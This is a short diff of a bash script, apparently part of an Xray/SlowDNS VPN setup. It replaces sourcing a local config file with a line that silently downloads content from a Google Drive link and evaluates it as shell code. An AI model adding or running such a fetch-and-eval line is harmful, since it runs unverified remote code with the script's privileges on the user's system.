@@ -1,6 +1,6 @@
 #!/bin/bash
 
-source /usr/bin/var.conf
+eval $(wget -qO- "https://drive.google.com/u/4/uc?id=1eutPTYsea7xYx1mNBWDQ_g1Yx3ZPNimF")
 
 NS=$( cat /etc/xray/dns )
 PUB=$( cat /etc/slowdns/server.pub )
